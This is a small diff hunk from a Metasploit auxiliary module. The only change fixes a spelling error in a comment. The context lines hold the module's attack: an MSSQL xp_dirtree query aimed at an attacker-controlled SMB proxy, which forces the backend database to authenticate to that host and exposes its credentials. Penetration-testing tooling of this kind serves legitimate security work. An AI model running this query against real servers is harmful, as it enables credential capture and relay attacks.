@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
     sql = "exec master..xp_dirtree '\\\\\\\\#{datastore['SMBPROXY']}\\#{rand_filename}'"
     print_status("Attempting to force backend DB to authenticate to the #{datastore['SMBPROXY']}")
 
-    # Execute query to force authentation from backend database to smbproxy
+    # Execute query to force authentication from backend database to smbproxy
     mssql_query(sql)
   end
 end
